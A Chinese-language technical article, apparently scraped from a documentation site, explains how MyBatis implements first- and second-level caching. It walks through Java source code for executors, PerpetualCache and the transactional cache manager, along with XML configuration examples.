得到某个TransactionalCache的值\n     */\n    public Object getObject(Cache cache, CacheKey key) {\n        return getTransactionalCache(cache).getObject(key);\n    }\n\n    public void putObject(Cache cache, CacheKey key, Object value) {\n        getTransactionalCache(cache).putObject(key, value);\n    }\n\n    /**\n     * 提交时全部提交\n     */\n    public void commit() {\n        for (TransactionalCache txCache : transactionalCaches.values()) {\n            txCache.commit();\n        }\n    }\n\n    /**\n     * 回滚时全部回滚\n     */\n    public void rollback() {\n        for (TransactionalCache txCache : transactionalCaches.values()) {\n            txCache.rollback();\n        }\n    }\n\n    private TransactionalCache getTransactionalCache(Cache cache) {\n        TransactionalCache txCache = transactionalCaches.get(cache);\n        if (txCache == null) {\n            txCache = new TransactionalCache(cache);\n            transactionalCaches.put(cache, txCache);\n        }\n        return txCache;\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\npublic class TransactionalCache implements Cache {\n\n    private Cache delegate;\n    // commit 时要不要清缓存\n    private boolean clearOnCommit;\n    // commit 时要添加的元素\n    private Map<Object, Object> entriesToAddOnCommit;\n    private Set<Object> entriesMissedInCache;\n\n    public TransactionalCache(Cache delegate) {\n        // delegate = FifoCache\n        this.delegate = delegate;\n        // 默认 commit 时不清缓存\n        this.clearOnCommit = false;\n        this.entriesToAddOnCommit = new HashMap<>();\n        this.entriesMissedInCache = new HashSet<>();\n    }\n\n    @Override\n    public String getId() {\n        return delegate.getId();\n    }\n\n    @Override\n    public int getSize() {\n        return delegate.getSize();\n    }\n\n    @Override\n    public Object getObject(Object key) {\n        // key：CacheKey 拼装后的哈希码\n        Object object = delegate.getObject(key);\n        if (object == null) {\n            entriesMissedInCache.add(key);\n        }\n        return clearOnCommit ? null : object;\n    }\n\n    @Override\n    public void putObject(Object key, Object object) {\n        entriesToAddOnCommit.put(key, object);\n    }\n\n    @Override\n    public Object removeObject(Object key) {\n        return null;\n    }\n\n    @Override\n    public void clear() {\n        clearOnCommit = true;\n        entriesToAddOnCommit.clear();\n    }\n\n    public void commit() {\n        if (clearOnCommit) {\n            delegate.clear();\n        }\n        flushPendingEntries();\n        reset();\n    }\n\n    public void rollback() {\n        unlockMissedEntries();\n        reset();\n    }\n\n    private void reset() {\n        clearOnCommit = false;\n        entriesToAddOnCommit.clear();\n        entriesMissedInCache.clear();\n    }\n\n    /**\n     * 刷新数据到 MappedStatement#Cache 中，也就是把数据填充到 Mapper XML 级别下。\n     * flushPendingEntries 方法把事务缓存下的数据，填充到 FifoCache 中。\n     */\n    private void flushPendingEntries() {\n        for (Map.Entry<Object, Object> entry : entriesToAddOnCommit.entrySet()) {\n            delegate.putObject(entry.getKey(), entry.getValue());\n        }\n        for (Object entry : entriesMissedInCache) {\n            if (!entriesToAddOnCommit.containsKey(entry)) {\n                delegate.putObject(entry, null);\n            }\n        }\n    }\n\n    private void unlockMissedEntries() {\n        for (Object entry : entriesMissedInCache) {\n            delegate.putObject(entry, null);\n        }\n    }\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n\n\n其实上面饶了一圈下来，最终操作的是 MappedStatement 维护的 Cache 对象， MappedStatement 是被全局 Configuration 在缓存的，所以查询结束不会清除 MappedStatement 对象和缓存信息，只有当触发 update，commit，rollback 等才会清除 MappedStatement 里维护的缓存信息',normalizedContent:'mybatis 的缓存分为一级缓存和二级缓存，缓存情况如下图，单服务架构中（有且仅有只有一个程序提供相同服务），一级缓存开启不会影响业务，只会提高性能。 微服务架构中需要关闭一级缓存，原因：service1 先查询数据，若之后 service2 修改了数据，之后 service1 又再次以同样的查询条件查询数据，因走缓存会出现查处的数据不是最新数据\n\n\n\n\n# 一级缓存\n\n一级缓存是基于 sqlsession 级别的，在同一个 session 的相同查询语句会才会从缓存中查询，所谓相同包括 sql 相同，条件相同等，那么我们看下在源码中具体是怎么维护和使用这个缓存的。\n\n\n# 解析\n\n描述一级缓存只需要在 <configuration> 标签中描述即可，而一级缓存的 value 值有 session 和 statement 两种，如果设置为 statement 基本可以算是关闭一级缓存，一级缓存是 mybatis 提供的默认缓存，所以不会在代码中看到判断一级缓存的条件\n\n<configuration>\n    <settings>\n        \x3c!--缓存级别：session/statement--\x3e\n        <setting name="localcachescope" value="session"/>\n    </settings>\n</configuration>\n\n\n1\n2\n3\n4\n5\n6\n\n\n解析核心代码会得到 localcachescope的值 ，维护到 configuration 全局配置中\n\nprivate void settingselement(element context) {\n    if (context == null) return;\n    list<element> elements = context.elements();\n    properties props = new properties();\n    for (element element : elements) {\n        props.setproperty(element.attributevalue("name"), element.attributevalue("value"));\n    }\n    // 是否启用二级缓存\n    configuration.setcacheenabled(booleanvalueof(props.getproperty("cacheenabled"), true));\n    // 一级缓存的配置\n    configuration.setlocalcachescope(localcachescope.valueof(props.getproperty("localcachescope")));\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n\n# 准备\n\n准备阶段主要是在 opensession 方法，他会在执行器里面去直接 new perpetualcache 永久缓存，执行器就拥有了这个缓存对象\n\n// 打开一个 session\n@override\npublic sqlsession opensession() {\n    transaction tx = null;\n    try {\n        final environment environment = configuration.getenvironment();\n        transactionfactory transactionfactory = environment.gettransactionfactory();\n        tx = transactionfactory.newtransaction(configuration.getenvironment().getdatasource(), transactionisolationlevel.read_committed, false);\n        // 创建执行器\n        final executor executor = configuration.newexecutor(tx);\n        // 创建defaultsqlsession\n        return new defaultsqlsession(configuration, executor);\n    } catch (exception e) {\n        try {\n            assert tx != null;\n            tx.close();\n        } catch (sqlexception ignore) {\n        }\n        throw new runtimeexception("error opening session.  cause: " + e);\n    }\n}\n\n// 创建执行器\npublic executor newexecutor(transaction transaction) {\n    executor executor = new simpleexecutor(this, transaction);\n    // 配置开启二级缓存，创建 cachingexecutor(默认就是有缓存)装饰者模式，\n    if (cacheenabled) {\n        executor = new cachingexecutor(executor);\n    }\n    return executor;\n}\n\n// simpleexecutor 简单执行器的构造方法\npublic class simpleexecutor extends baseexecutor {\n    public simpleexecutor(configuration configuration, transaction transaction) {\n        super(configuration, transaction);\n    }\n}\n\n// 基础执行器的构造方法\nprotected baseexecutor(configuration configuration, transaction transaction) {\n    this.configuration = configuration;\n    this.transaction = transaction;\n    this.wrapper = this;\n    // new 一个永久缓存\n    this.localcache = new perpetualcache("localcache");\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n\n\nperpetualcache 继承了 cache ，并实现了基本的对缓存的操作\n\npublic class perpetualcache implements cache {\n    private string id;\n    // 使用hashmap存放一级缓存数据，session 生命周期较短，正常情况下数据不会一直在缓存存放\n    private map<object, object> cache = new hashmap<>();\n    public perpetualcache(string id) {\n        this.id = id;\n    }\n    @override\n    public string getid() {\n        return id;\n    }\n    @override\n    public void putobject(object key, object value) {\n        cache.put(key, value);\n    }\n    @override\n    public object getobject(object key) {\n        return cache.get(key);\n    }\n    @override\n    public object removeobject(object key) {\n        return cache.remove(key);\n    }\n    @override\n    public void clear() {\n        cache.clear();\n    }\n    @override\n    public int getsize() {\n        return cache.size();\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n\n\n\n# 执行\n\n在准备阶段已经得到了执行器，并在执行器里面得到了 perpetualcache 缓存，只需要知道客户使用的是查询还是修改等操作后，执行执行器里面对应的 query or update 方法即可\n\npublic abstract class baseexecutor implements executor {\n\n    private org.slf4j.logger logger = loggerfactory.getlogger(baseexecutor.class);\n\n    protected configuration configuration;\n    protected transaction transaction;\n    protected executor wrapper;\n\n    // 本地缓存\n    protected perpetualcache localcache;\n\n    private boolean closed;\n    // 查询堆栈\n    protected int querystack = 0;\n\n    protected baseexecutor(configuration configuration, transaction transaction) {\n        this.configuration = configuration;\n        this.transaction = transaction;\n        this.wrapper = this;\n        this.localcache = new perpetualcache("localcache");\n    }\n\n    @override\n    public int update(mappedstatement ms, object parameter) throws sqlexception {\n        if (closed) {\n            throw new runtimeexception("executor was closed.");\n        }\n        clearlocalcache();\n        return doupdate(ms, parameter);\n    }\n\n    @override\n    public <e> list<e> query(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler) throws sqlexception {\n        // 1. 获取绑定sql\n        boundsql boundsql = ms.getboundsql(parameter);\n        // 2. 创建缓存key\n        cachekey key = createcachekey(ms, parameter, rowbounds, boundsql);\n        return query(ms, parameter, rowbounds, resulthandler, key, boundsql);\n    }\n\n    @override\n    public <e> list<e> query(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler, cachekey key, boundsql boundsql) throws sqlexception {\n        if (closed) {\n            throw new runtimeexception("executor was closed.");\n        }\n        // 清理局部缓存，查询堆栈为0则清理。querystack 避免递归调用清理\n        if (querystack == 0 && ms.isflushcacherequired()) {\n            clearlocalcache();\n        }\n        list<e> list;\n        try {\n            querystack++;\n            // 根据cachekey从localcache中查询数据\n            list = resulthandler == null ? (list<e>) localcache.getobject(key) : null;\n            if (list == null) {\n                list = queryfromdatabase(ms, parameter, rowbounds, resulthandler, key, boundsql);\n            }\n        } finally {\n            querystack--;\n        }\n        if (querystack == 0) {\n            if (configuration.getlocalcachescope() == localcachescope.statement) {\n                clearlocalcache();\n            }\n        }\n        return list;\n    }\n\n    private <e> list<e> queryfromdatabase(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler, cachekey key, boundsql boundsql) throws sqlexception {\n        list<e> list;\n        localcache.putobject(key, executionplaceholder.execution_placeholder);\n        try {\n            list = doquery(ms, parameter, rowbounds, resulthandler, boundsql);\n        } finally {\n            localcache.removeobject(key);\n        }\n        // 存入缓存\n        localcache.putobject(key, list);\n        return list;\n    }\n\n    protected abstract int doupdate(mappedstatement ms, object parameter) throws sqlexception;\n\n    protected abstract <e> list<e> doquery(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler, boundsql boundsql) throws sqlexception;\n\n    @override\n    public transaction gettransaction() {\n        if (closed) {\n            throw new runtimeexception("executor was closed.");\n        }\n        return transaction;\n    }\n\n    @override\n    public void commit(boolean required) throws sqlexception {\n        if (closed) {\n            throw new runtimeexception("cannot commit, transaction is already closed");\n        }\n        clearlocalcache();\n        if (required) {\n            transaction.commit();\n        }\n    }\n\n    @override\n    public void rollback(boolean required) throws sqlexception {\n        if (!closed) {\n            try {\n                clearlocalcache();\n            } finally {\n                if (required) {\n                    transaction.rollback();\n                }\n            }\n        }\n    }\n\n    @override\n    public void clearlocalcache() {\n        if (!closed) {\n            localcache.clear();\n        }\n    }\n\n    @override\n    public cachekey createcachekey(mappedstatement ms, object parameterobject, rowbounds rowbounds, boundsql boundsql) {\n        if (closed) {\n            throw new runtimeexception("executor was closed.");\n        }\n        cachekey cachekey = new cachekey();\n        cachekey.update(ms.getid());\n        cachekey.update(rowbounds.getoffset());\n        cachekey.update(rowbounds.getlimit());\n        cachekey.update(boundsql.getsql());\n        list<parametermapping> parametermappings = boundsql.getparametermappings();\n        typehandlerregistry typehandlerregistry = ms.getconfiguration().gettypehandlerregistry();\n        for (parametermapping parametermapping : parametermappings) {\n            object value;\n            string propertyname = parametermapping.getproperty();\n            if (boundsql.hasadditionalparameter(propertyname)) {\n                value = boundsql.getadditionalparameter(propertyname);\n            } else if (parameterobject == null) {\n                value = null;\n            } else if (typehandlerregistry.hastypehandler(parameterobject.getclass())) {\n                value = parameterobject;\n            } else {\n                metaobject metaobject = configuration.newmetaobject(parameterobject);\n                value = metaobject.getvalue(propertyname);\n            }\n            cachekey.update(value);\n        }\n        if (configuration.getenvironment() != null) {\n            cachekey.update(configuration.getenvironment().getid());\n        }\n        return cachekey;\n    }\n\n    @override\n    public void setexecutorwrapper(executor executor) {\n        this.wrapper = wrapper;\n    }\n\n    @override\n    public void close(boolean forcerollback) {\n        try {\n            try {\n                rollback(forcerollback);\n            } finally {\n                transaction.close();\n            }\n        } catch (sqlexception e) {\n            logger.warn("unexpected exception on closing transaction.  cause: " + e);\n        } finally {\n            transaction = null;\n            localcache = null;\n            closed = true;\n        }\n    }\n\n    protected void closestatement(statement statement) {\n        if (statement != null) {\n            try {\n                statement.close();\n            } catch (sqlexception ignore) {\n            }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n\n\n可以看到 执行器里面维护了 query update commit 等方法，在执行查询的时候会先生成 cachekey ，会按照 namespace.id + 分页offset + 分页limit + 执行的sql语句 + 查询条件的值 + 环境id 生成唯一的 key，然后做为查询缓存的 key，查询结果做为 value，如果同一各 sqlsession 执行相同语句和条件以及分页等，就会从缓存中命中并返回结果。缓存的清除，就是当该 sqlsession 执行 update，commit，close，rollback 时该 sqlsession 就清除缓存。\n\n在 sql 语句中也可以设置清除缓存，只需要在 <select>、<insert> 和 <update> 等 sql 标签中设置 flushcache="true" 属性会强制清空本地缓存，使得下次查询时重新从数据库中获取数据。适用于一级缓存和二级缓存\n\n<select id="selectbyid" resulttype="com.example.user" flushcache="true">\n  select * from user where id = #{id}\n</select>\n\n\n1\n2\n3\n\n\n\n# 二级缓存\n\n二级缓存是为 namespace 也叫 mapper 级别的缓存，是跨 sqlsession 的，他会在原有的执行器上封装一个 cachingexecutor ，来管理缓存， cachingexecutor 使用了装饰器模式来装饰基础的 executor 执行器。\n\n\n# 解析\n\n在二级缓存中的配置方式具体如下\n\n\x3c!-- 必须先开启缓存 --\x3e\n<configuration>\n    <settings>\n        \x3c!--  true/false 二级缓存是否使用 --\x3e\n        <setting name="cacheenabled" value="true"/>\n    </settings>\n</configuration>\n\n\x3c!-- 指定在某个mapper中使用 --\x3e\n<mapper namespace="com.example.mymapper">\n    \x3c!-- 设置该mapper的二级缓存 --\x3e\n    <cache eviction="lru" flushinterval="100000" readonly="true" size="1024"/>\n    \x3c!-- usecache：表示是否使用二级缓存，如果设置为 true，则会使用二级缓存。对于 select 元素，默认值为 true。 --\x3e\n    \x3c!-- usecache 属性只能控制是否使用二级缓存，它不能关闭一级缓存。一级缓存是 mybatis 的默认行为，它总是开启的，无法关闭。 --\x3e\n    <select id="queryactivitybyid" parametertype="cn.bugstack.mybatis.test.po.activity" flushcache="false" usecache="true">\n        select activity_id, activity_name, activity_desc, create_time, update_time\n        from activity\n        <trim prefix="where" prefixoverrides="and | or" suffixoverrides="and">\n            <if test="null != activityid">\n                activity_id = #{activityid}\n            </if>\n        </trim>\n    </select>\n</mapper>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n\n\n其中 <cache > 标签有多个属性，这里一一介绍一下：\n\n * type：可以指定自定义缓存，但是该类必须实现，而且是全类名\n * eviction：缓存回收策略，默认为 lru（least recently used），策略介绍如下：\n   lru：按照访问时间排序，最近未使用的数据优先清除。\n   fifo：按照插入时间排序，先插入的数据先清除。\n   soft：基于垃圾回收算法，当系统内存不足时，会优先清理不常用的、占用内存较多的数据。\n   weak：弱引用机制，当 jvm 进行垃圾回收时，如果判断一个对象只被弱引用指向，则会将其回收。\n * flushinterval：刷新间隔时间，表示多长时间刷新一次缓存，单位为毫秒，默认不刷新。\n * size：缓存的大小，表示最多可以缓存多少个对象。\n * readonly：是否只读，默认为 false，表示启用缓存更新机制。\n * blocking：是否启用阻塞，默认为 false，表示不启用。\n\n> flushinterval 默认情况下，mybatis 采用基于 perpetualcache (永久缓存) 的缓存实现方式，即缓存会一直保存在内存中，直到会话关闭时才被清除。而当我们使用基于 ehcache 的缓存实现时，可以通过设置 flushinterval 属性控制缓存的刷新时间，即定时将缓存中的数据写入到磁盘或持久化存储中，以避免缓存过期、失效或内存溢出等问题。\n\n当 mybaits 启动后会读到二级缓存的配置，先会进行 <cache> 基础的解析，得到 xml 里面的属性值，其次用值信息组成一个 cache 对象，并把这个 cache 对象维护到全局配置 configuration 中，该全局配置里面是维护一个 map 结构的容器\n\n// 开始解析\nprivate void cacheelement(element context) {\n    if (context == null) return;\n    // 基础配置信息，默认是永恒缓存\n    string type = context.attributevalue("type", "perpetual");\n    class<? extends cache> typeclass = typealiasregistry.resolvealias(type);\n    // 缓存队列 fifo\n    string eviction = context.attributevalue("eviction", "fifo");\n    class<? extends cache> evictionclass = typealiasregistry.resolvealias(eviction);\n    long flushinterval = long.valueof(context.attributevalue("flushinterval"));\n    integer size = integer.valueof(context.attributevalue("size"));\n    boolean readwrite = !boolean.parseboolean(context.attributevalue("readonly", "false"));\n    boolean blocking = !boolean.parseboolean(context.attributevalue("blocking", "false"));\n\n    // 解析额外属性信息；<property name="cachefile" value="/tmp/xxx-cache.tmp"/>\n    list<element> elements = context.elements();\n    properties props = new properties();\n    for (element element : elements) {\n        props.setproperty(element.attributevalue("name"), element.attributevalue("value"));\n    }\n    // 构建缓存\n    builderassistant.usenewcache(typeclass, evictionclass, flushinterval, size, readwrite, blocking, props);\n}\n\n// 构建cache\npublic cache usenewcache(class<? extends cache> typeclass,\n                        class<? extends cache> evictionclass,\n                        long flushinterval,\n                        integer size,\n                        boolean readwrite,\n                        boolean blocking,\n                        properties props) {\n    // 判断为null，则用默认值\n    typeclass = valueordefault(typeclass, perpetualcache.class);\n    evictionclass = valueordefault(evictionclass, fifocache.class);\n\n    // 建造者模式构建 cache [currentnamespace=cn.bugstack.mybatis.test.dao.iactivitydao]\n    cache cache = new cachebuilder(currentnamespace)\n            .implementation(typeclass)\n            .adddecorator(evictionclass)\n            .clearinterval(flushinterval)\n            .size(size)\n            .readwrite(readwrite)\n            .blocking(blocking)\n            .properties(props)\n            .build();\n\n    // 添加缓存\n    configuration.addcache(cache);\n    // 给自己维护一个 cache 以便后续 mappedstatement 用到\n    currentcache = cache;\n    return cache;\n}\n\n// 添加到 configuration全局配置维护的 caches中\npublic class configuration {\n    // 缓存,存在map里\n    protected final map<string, cache> caches = new hashmap<>();\n    public void addcache(cache cache) {\n        caches.put(cache.getid(), cache);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\n缓存解析过了，但是最主要的还是 <select> 标签着一些，标签上面描述了具体的缓存是否使用，缓存是否清除，所以还需要解析标签上的缓存信息，主要是 flushcache 和 usecache 这两个属性\n\n// 解析操作\npublic void parsestatementnode() {\n    string id = element.attributevalue("id");\n    // 参数类型\n    string parametertype = element.attributevalue("parametertype");\n    class<?> parametertypeclass = resolvealias(parametertype);\n    // 外部应用 resultmap\n    string resultmap = element.attributevalue("resultmap");\n    // 结果类型\n    string resulttype = element.attributevalue("resulttype");\n    class<?> resulttypeclass = resolvealias(resulttype);\n    // 获取命令类型(select|insert|update|delete)\n    string nodename = element.getname();\n    sqlcommandtype sqlcommandtype = sqlcommandtype.valueof(nodename.touppercase(locale.english));\n\n    boolean isselect = sqlcommandtype == sqlcommandtype.select;\n    boolean flushcache = boolean.parseboolean(element.attributevalue("flushcache", string.valueof(!isselect)));\n    boolean usecache = boolean.parseboolean(element.attributevalue("usecache", string.valueof(isselect)));\n\n    // 获取默认语言驱动器\n    class<?> langclass = configuration.getlanguageregistry().getdefaultdriverclass();\n    languagedriver langdriver = configuration.getlanguageregistry().getdriver(langclass);\n\n    // 解析<selectkey> step-14 新增\n    processselectkeynodes(id, parametertypeclass, langdriver);\n\n    // 解析成sqlsource，dynamicsqlsource/rawsqlsource\n    sqlsource sqlsource = langdriver.createsqlsource(configuration, element, parametertypeclass);\n\n    // 属性标记【仅对 insert 有用】, mybatis 会通过 getgeneratedkeys 或者通过 insert 语句的 selectkey 子元素设置它的值 step-14 新增\n    string keyproperty = element.attributevalue("keyproperty");\n\n    keygenerator keygenerator = null;\n    string keystatementid = id + selectkeygenerator.select_key_suffix;\n    keystatementid = builderassistant.applycurrentnamespace(keystatementid, true);\n\n    if (configuration.haskeygenerator(keystatementid)) {\n        keygenerator = configuration.getkeygenerator(keystatementid);\n    } else {\n        keygenerator = configuration.isusegeneratedkeys() && sqlcommandtype.insert.equals(sqlcommandtype) ? new jdbc3keygenerator() : new nokeygenerator();\n    }\n    // 调用助手类\n    builderassistant.addmappedstatement(id,\n            sqlsource,\n            sqlcommandtype,\n            parametertypeclass,\n            resultmap,\n            resulttypeclass,\n            flushcache,\n            usecache,\n            keygenerator,\n            keyproperty,\n            langdriver);\n}\n\n// 把信息添加到 mappedstatement对象\npublic mappedstatement addmappedstatement(\n        string id,\n        sqlsource sqlsource,\n        sqlcommandtype sqlcommandtype,\n        class<?> parametertype,\n        string resultmap,\n        class<?> resulttype,\n        boolean flushcache,\n        boolean usecache,\n        keygenerator keygenerator,\n        string keyproperty,\n        languagedriver lang\n) {\n    // 给id加上namespace前缀：cn.bugstack.mybatis.test.dao.iuserdao.queryuserinfobyid\n    id = applycurrentnamespace(id, false);\n    //是否是select语句\n    boolean isselect = sqlcommandtype == sqlcommandtype.select;\n\n    mappedstatement.builder statementbuilder = new mappedstatement.builder(configuration, id, sqlcommandtype, sqlsource, resulttype);\n    statementbuilder.resource(resource);\n    statementbuilder.keygenerator(keygenerator);\n    statementbuilder.keyproperty(keyproperty);\n\n    // 结果映射，给 mappedstatement#resultmaps\n    setstatementresultmap(resultmap, resulttype, statementbuilder);\n    // 维护缓存信息\n    setstatementcache(isselect, flushcache, usecache, currentcache, statementbuilder);\n    mappedstatement statement = statementbuilder.build();\n    // 映射语句信息，建造完存放到配置项中\n    configuration.addmappedstatement(statement);\n    return statement;\n}\n\n// 给statement添加缓存信息\nprivate void setstatementcache(\n        boolean isselect,\n        boolean flushcache,\n        boolean usecache,\n        cache cache,\n        mappedstatement.builder statementbuilder) {\n    flushcache = valueordefault(flushcache, !isselect);\n    usecache = valueordefault(usecache, isselect);\n    statementbuilder.flushcacherequired(flushcache);\n    statementbuilder.usecache(usecache);\n    statementbuilder.cache(cache);\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n\n\n在具体的 addmappedstatement 的时候，可以看到会得到一个 mappedstatement 对象，该对象就是封装了 sql 标签的所有信息，在 setstatementcache 方法中，不仅只把 flushcache和usecache 进行了设置，额外的还带有一个 cache ，该 cache 就是在调用 usenewcache 方法，内部赋值的 currentcache ，他们的方法是在同一个类中，因此可以使用。这样 mappedstatement 对象也就拥有了 <cache> 标签的能力，到此解析完毕\n\n\n# 准备\n\n和一级缓存一样，都是在 opensession 的时候去做实例化，但是不同的是，二级缓存会在一级缓存上进行一个装饰，并且首要会判断是否允许开启二级缓存。\n\nif (cacheenabled) {\n    executor = new cachingexecutor(executor);\n}\n\n\n1\n2\n3\n\n\ncachingexecutor 接收 executor ，并对其进行包装，内部方法依然调用的是 baseexecutor 的相关方法。 cachingexecutor 内部还维护了 transactionalcachemanager 事务缓存管理器，该管理器内部维护 map<cache, transactionalcache> ， transactionalcache 内部又维护了 cache 以及 entriesmissedincache 和 entriestoaddoncommit\n\n\n# 执行\n\npublic class cachingexecutor implements executor {\n\n    private logger logger = loggerfactory.getlogger(cachingexecutor.class);\n    private executor delegate;\n    // 事务缓存管理器\n    private transactionalcachemanager tcm = new transactionalcachemanager();\n\n    public cachingexecutor(executor delegate) {\n        this.delegate = delegate;\n        delegate.setexecutorwrapper(this);\n    }\n\n    @override\n    public int update(mappedstatement ms, object parameter) throws sqlexception {\n        return delegate.update(ms, parameter);\n    }\n\n    @override\n    public <e> list<e> query(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler, cachekey key, boundsql boundsql) throws sqlexception {\n        cache cache = ms.getcache();\n        if (cache != null) {\n            flushcacheifrequired(ms);\n            if (ms.isusecache() && resulthandler == null) {\n                @suppresswarnings("unchecked")\n                list<e> list = (list<e>) tcm.getobject(cache, key);\n                if (list == null) {\n                    list = delegate.<e>query(ms, parameter, rowbounds, resulthandler, key, boundsql);\n                    // cache：缓存队列实现类，fifo\n                    // key：哈希值 [mappedstatementid + offset + limit + sql + queryparams + environment]\n                    // list：查询的数据\n                    tcm.putobject(cache, key, list);\n                }\n                // 打印调试日志，记录二级缓存获取数据\n                if (logger.isdebugenabled() && cache.getsize() > 0) {\n                    logger.debug("二级缓存：{}", json.tojsonstring(list));\n                }\n                return list;\n            }\n        }\n        return delegate.<e>query(ms, parameter, rowbounds, resulthandler, key, boundsql);\n    }\n\n    @override\n    public <e> list<e> query(mappedstatement ms, object parameter, rowbounds rowbounds, resulthandler resulthandler) throws sqlexception {\n        // 1. 获取绑定sql\n        boundsql boundsql = ms.getboundsql(parameter);\n        // 2. 创建缓存key\n        cachekey key = createcachekey(ms, parameter, rowbounds, boundsql);\n        return query(ms, parameter, rowbounds, resulthandler, key, boundsql);\n    }\n\n    @override\n    public transaction gettransaction() {\n        return delegate.gettransaction();\n    }\n\n    @override\n    public void commit(boolean required) throws sqlexception {\n        delegate.commit(required);\n        tcm.commit();\n    }\n\n    @override\n    public void rollback(boolean required) throws sqlexception {\n        try {\n            delegate.rollback(required);\n        } finally {\n            if (required) {\n                tcm.rollback();\n            }\n        }\n    }\n\n    @override\n    public void close(boolean forcerollback) {\n        try {\n            if (forcerollback) {\n                tcm.rollback();\n            } else {\n                tcm.commit();\n            }\n        } finally {\n            delegate.close(forcerollback);\n        }\n    }\n\n    @override\n    public void clearlocalcache() {\n        delegate.clearlocalcache();\n    }\n\n    @override\n    public cachekey createcachekey(mappedstatement ms, object parameterobject, rowbounds rowbounds, boundsql boundsql) {\n        return delegate.createcachekey(ms, parameterobject, rowbounds, boundsql);\n    }\n\n    @override\n    public void setexecutorwrapper(executor executor) {\n        throw new unsupportedoperationexception("this method should not be called");\n    }\n\n    private void flushcacheifrequired(mappedstatement ms) {\n        cache cache = ms.getcache();\n        if (cache != null && ms.isflushcacherequired()) {\n            tcm.clear(cache);\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n\n\npublic class transactionalcachemanager {\n\n    private map<cache, transactionalcache> transactionalcaches = new hashmap<>();\n\n    public void clear(cache cache) {\n        gettransactionalcache(cache).clear();\n    }\n\n    /**\n     * 得到某个transactionalcache的值\n     */\n    public object getobject(cache cache, cachekey key) {\n        return gettransactionalcache(cache).getobject(key);\n    }\n\n    public void putobject(cache cache, cachekey key, object value) {\n        gettransactionalcache(cache).putobject(key, value);\n    }\n\n    /**\n     * 提交时全部提交\n     */\n    public void 